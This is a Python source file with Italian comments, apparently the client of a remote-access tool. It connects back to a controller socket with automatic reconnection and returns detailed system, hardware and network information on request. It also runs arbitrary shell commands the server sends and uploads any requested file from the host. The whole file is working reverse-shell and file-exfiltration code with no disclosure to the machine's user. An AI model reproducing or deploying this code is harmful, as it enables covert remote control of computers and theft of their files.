from socket import *
from datetime import datetime
from uuid import getnode as get_mac
import os, platform, subprocess, re, time
import tqdm
import psutil
import math

BUFFER_SIZE = 1024 * 16
serverName = 'localhost'
serverPort = 12003
clientSocket = socket(AF_INET, SOCK_STREAM)
def connessione():
    global cwd
    connesso = False
    tempo_attesa = 5
    
    while connesso == False :
        try:
            clientSocket.connect((serverName,serverPort))
        except Exception as e:
            # Server inattivo, si ritenta la connessione dopo un tempo sempre maggiore
            time.sleep(tempo_attesa)
            tempo_attesa*=2
        else:
            connesso = True 
            cwd = os.getcwd()
            invia_messaggio(cwd)
            
def invia_messaggio(messaggio):
    global clientSocket
    while True:
        try:
            numripetizioni = math.ceil((len(messaggio)/BUFFER_SIZE))
            clientSocket.send(str(numripetizioni).encode('utf-8','ignore'))
            clientSocket.send(messaggio.encode('utf-8','ignore'))
            break
        except Exception as e:
            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
            clientSocket.close()
            clientSocket = socket(AF_INET, SOCK_STREAM)
            connessione()

def ricevi_messaggio():
    global clientSocket
    while True:
        try:
            messaggio = clientSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
            return messaggio
        except Exception as e:
            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
            clientSocket.close()
            clientSocket = socket(AF_INET, SOCK_STREAM)
            connessione()
def getSystemInfo():
    intestazione = "\n=== INFORMAZIONI SUL SISTEMA === \n"
    info_sistema_operativo = platform.uname()
    nome_so = info_sistema_operativo.system
    nome_utente = info_sistema_operativo.node
    release_so = info_sistema_operativo.release
    versione_so = info_sistema_operativo.version
    architettura = info_sistema_operativo.machine
    system_info = "Nome utente: "+nome_utente+"\n"+\
                  "Sistema operativo: "+nome_so+"\n"+\
                  "Release SO: "+release_so+"\n"+\
                  "Versione SO: "+versione_so+"\n"+\
                  "Architettura: "+architettura+"\n"
    return intestazione+system_info

def getCPUInfo():
    intestazione = "\n=== INFORMAZIONI SULLA CPU === \n"
    if platform.system() == "Windows":
        infoCpuOsWindows = platform.processor()
        core_fisici_cpu = psutil.cpu_count(logical=False)
        core_totali_cpu = psutil.cpu_count(logical=True)
        frequenza_cpu = psutil.cpu_freq()
        max_frequenza_cpu = frequenza_cpu.max
        min_frequenza_cpu = frequenza_cpu.min
        frequenza_cpu_corrente = frequenza_cpu.current
        percentuale_uso_cpu = psutil.cpu_percent()
        info_cpu_windows = f"Processore: {infoCpuOsWindows}" + "\n" + \
                           f"Core fisici CPU: {core_fisici_cpu}" + "\n" + \
                           f"Core totali CPU: {core_totali_cpu}" + "\n" + \
                           f"Frequenza max. CPU {max_frequenza_cpu:.2f}" + " Mhz" + "\n" + \
                           f"Frequenza min. CPU: {min_frequenza_cpu:.2f}" + " Mhz" + "\n" + \
                           f"Frequenza CPU corrente: {frequenza_cpu_corrente:.2f}" + " Mhz" + "\n" + \
                           f"Percentuale uso CPU: {percentuale_uso_cpu}" + "%" + "\n"
        return intestazione+info_cpu_windows
    elif platform.system() == "Darwin":
        os.environ['PATH'] = os.environ['PATH'] + os.pathsep + '/usr/sbin'
        comando_cpu = "sysctl -n machdep.cpu.brand_string"
        info_cpu_os_darwin = subprocess.check_output(comando_cpu).strip()
        return intestazione+info_cpu_os_darwin
    elif platform.system() == "Linux":
        comando_cpu = "cat /proc/cpuinfo | grep -v '^flags'"
        info_cpu_os_linux = subprocess.check_output(comando_cpu, shell=True).decode().strip()
        return intestazione+info_cpu_os_linux
    return ""

def getBootTimeInfo():
    intestazione = "\n=== INFORMAZIONI SUL TEMPO D'AVVIO === \n"
    boot_time_timestamp = psutil.boot_time()
    boot_time = datetime.fromtimestamp(boot_time_timestamp)
    giorno = boot_time.day
    mese = boot_time.month
    anno = boot_time.year
    ore = boot_time.hour
    minuti = boot_time.minute
    secondi = boot_time.second
    boot_time_info = f"Il sistema e\' attivo dal giorno {giorno}/{mese}/{anno} dalle ore {ore}:{minuti}:{secondi}\n"
    return intestazione+boot_time_info

def getMemoryInfo():
    intestazione = "\n=== INFORMAZIONI SULLA MEMORIA RAM === \n"
    info_memoria = psutil.virtual_memory()
    memoria_totale = converti_byte(info_memoria.total)
    memoria_disponibile = converti_byte(info_memoria.available)
    memoria_usata = converti_byte(info_memoria.used)
    percentuale_memoria_usata = info_memoria.percent
    memory_info = f"Memoria totale: {memoria_totale}" + "\n" + \
                  f"Memoria disponibile: {memoria_disponibile}" + "\n" + \
                  f"Memoria in uso: {memoria_usata}" + "\n" + \
                  f"Percentuale memoria in uso: {percentuale_memoria_usata}%" + "\n"
    return intestazione + memory_info

def getDiskInfo():
    intestazione = "\n=== INFORMAZIONI SUL DISCO E SULLE PARTIZIONI === \n"
    sub_intestazione_1 = "\n=== PARTIZIONI INDIVIDUATE ===\n"
    sub_intestazione_2 = "\n=== DETTAGLIO PARTIZIONI ===\n"
    partizioni = psutil.disk_partitions()
    info_partizioni = ""
    dettagli_partizioni = ""

    for partizione in partizioni:
        nome_partizione = partizione.device
        punto_di_mount_partizione = partizione.mountpoint
        tipo_file_system = partizione.fstype

        info_partizioni = info_partizioni + \
                          "Nome partizione: " + nome_partizione + "\n" + \
                          "Punto di mount: " + punto_di_mount_partizione + "\n" + \
                          "Tipo di file system: " + tipo_file_system + "\n\n"
        try:
            dimensione_partizione = converti_byte((psutil.disk_usage(punto_di_mount_partizione)).total)
            spazio_occupato_partizione = converti_byte((psutil.disk_usage(punto_di_mount_partizione)).used)
            spazio_libero_partizione = converti_byte((psutil.disk_usage(punto_di_mount_partizione)).free)
            percentuale_spazio_occupato = psutil.disk_usage(punto_di_mount_partizione).percent
        except PermissionError:
            continue

        dettagli_partizioni = dettagli_partizioni + \
                              "Nome partizione: " + nome_partizione + "\n" + \
                              "Dimensione: " + dimensione_partizione + "\n" + \
                              "Spazio occupato: " + spazio_occupato_partizione + "\n" + \
                              "Spazio libero: " + spazio_libero_partizione + "\n" + \
                              "Percentuale spazio occupato: " + str(percentuale_spazio_occupato) + "%" + "\n\n"

        informazioni_disco = intestazione+sub_intestazione_1+info_partizioni+sub_intestazione_2+dettagli_partizioni
    return informazioni_disco

def getNetworkInfo():
    intestazione = "\n=== INFORMAZIONI SULLA SCHEDA DI RETE E INTERFACCE DI RETE === \n"
    info_rete = psutil.net_if_addrs()
    valore_indirizzo_mac = get_mac()
    indirizzo_mac = '{0:016x}'.format(valore_indirizzo_mac)
    indirizzo_mac = ':'.join(re.findall(r'\w\w', indirizzo_mac)).upper()
    dettagli_rete = "Indirizzo MAC scheda di rete: " + indirizzo_mac + "\n\n"

    for nome_interfaccia_rete, indirizzi_interfaccia_rete in info_rete.items():
        for indirizzo_rete in indirizzi_interfaccia_rete:
            if (str(indirizzo_rete.family) == 'AddressFamily.AF_INET'):
                dettagli_rete = dettagli_rete + \
                                "Nome interfaccia di rete: " + nome_interfaccia_rete + "\n" + \
                                "Indirizzo IP: " + str(indirizzo_rete.address) + "\n" + \
                                "Network mask: " + str(indirizzo_rete.netmask) + "\n" + \
                                "Broadcast: " + str(indirizzo_rete.broadcast) + "\n\n"
    return intestazione+dettagli_rete

def getNetworkStats():
    intestazione = "\n=== STATISTICHE SULLA RETE === \n"
    statistiche_rete = psutil.net_io_counters(pernic=False, nowrap=True)
    byte_inviati = converti_byte(statistiche_rete.bytes_sent)
    byte_ricevuti = converti_byte(statistiche_rete.bytes_recv)
    pacchetti_inviati = statistiche_rete.packets_sent
    pacchetti_ricevuti = statistiche_rete.packets_recv
    tot_errori_ricezione_pacchetti = statistiche_rete.errin
    tot_errori_invio_pacchetti = statistiche_rete.errout
    pacchetti_in_arrivo_persi = statistiche_rete.dropin
    pacchetti_in_uscita_persi = statistiche_rete.dropout
    statistiche = f"Totale byte inviati: {byte_inviati}" + "\n" + \
                  f"Totale byte ricevuti: {byte_ricevuti}" + "\n" + \
                  f"Totale pacchetti inviati: {pacchetti_inviati}" + "\n" + \
                  f"Totale pacchetti ricevuti: {pacchetti_ricevuti}" + "\n" + \
                  f"Totale errori in ricezione pacchetti: {tot_errori_ricezione_pacchetti}" + "\n" + \
                  f"Totale errori in invio pacchetti: {tot_errori_invio_pacchetti}" + "\n" + \
                  f"Totale pacchetti in arrivo persi: {pacchetti_in_arrivo_persi}" + "\n" + \
                  f"Totale pacchetti in uscita persi: {pacchetti_in_uscita_persi}" + "\n\n"
    return intestazione + statistiche

def executeShellCommand(cmd):
    #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi\
    global cwd
    invio_file = False
    split_cmd = cmd.split()
    if split_cmd[0] == "cd":
        #Tentativo per cambiamento directory assoluta
        if (len(split_cmd)!=2): output = "Errore"
        else:
            if split_cmd[1].find('/') == 0:
                try:
                    os.chdir(''.join(split_cmd[1]))
                except FileNotFoundError as e:
                    #se c'e un errore lo restituiamo in output
                    output = str(e)
                else:
                    output = ''
            else: 
            #Tentativo per cambiamento directory relativa
                try:
                    os.chdir(cwd+'/'+''.join(split_cmd[1]))
                except Exception as e:
                    #se c'e un errore lo restituiamo in output
                    output = str(e)
                else:
                    output = ''
    elif cmd == 'systeminfo':
        output = subprocess.check_output([cmd]).decode('utf-8','ignore')
    elif split_cmd[0] == "download":
        if(len(split_cmd)!=2):
            output = "Non si puo scaricare un file senza nome!"
        else:
            output = invia_file(split_cmd[1]) #
            invio_file = True
    else: 
        output = subprocess.getoutput(cmd)
    cwd = os.getcwd()
    if not invio_file:
        message = output + '<sep>' + cwd 
        invia_messaggio(message)
    else:
        message = output+"<sep>"+cwd
        invia_messaggio(message)


def converti_byte(byte):
    """
    Converte i byte nel proprio formato corrispondente
    Esempio:
    1253656 = '1.20MB'
    1253656678 = '1.17GB'
    """
    suffisso_byte = "B"
    fattore_byte = 1024

    for unita_byte in ["", "K", "M", "G", "T", "P"]:
        if byte < fattore_byte:
            byte_convertito = f"{byte:.2f}{unita_byte}{suffisso_byte}" #f-string
            return byte_convertito
        byte = byte/fattore_byte

def invia_file(nome):
    try:
        size = os.path.getsize(nome)
        invia_messaggio("File esistente")
    except:
        return "Il file richiesto non esiste"
    clientSocket.send(f"{size}".encode())
    ricevi_messaggio()
    progress = tqdm.tqdm(range(size), f"Invio {nome}", unit="B", unit_scale=True, unit_divisor=1024)

    with open(nome,"rb") as f:
        while True:
            bytes_letti = f.read(BUFFER_SIZE)
            print(len(bytes_letti))
            if not bytes_letti:
                return "Ricezione completata"
            clientSocket.send(bytes_letti)
            progress.update(len(bytes_letti))
            
        

connessione()
while True:
    #Ricaviamo la current working directory dell host su cui gira il client
    #Inviamo una seconda volta la cwd per motivi di interfaccia lato server
    comando = ricevi_messaggio()
    
    if comando == "1":
        invia_messaggio(getSystemInfo())
    elif comando == "2":
        invia_messaggio(getCPUInfo())
    elif comando == "3":
        invia_messaggio(getBootTimeInfo())
    elif comando == "4":
        invia_messaggio(getMemoryInfo())
    elif comando == "5":
        invia_messaggio(getDiskInfo())
    elif comando == "6":
        invia_messaggio(getNetworkInfo()+getNetworkStats())
    elif comando.split('<sep>')[0] == "7":
        executeShellCommand(comando.split('<sep>')[1])
    elif comando == "9":
        riepilogo_informazioni = str(getSystemInfo()+getCPUInfo()+getBootTimeInfo()+getMemoryInfo()+getDiskInfo()+getNetworkInfo()+getNetworkStats())
        invia_messaggio(riepilogo_informazioni)
    elif comando == "0":
        break
    else:
        invia_messaggio("Errore comando")

clientSocket.close()
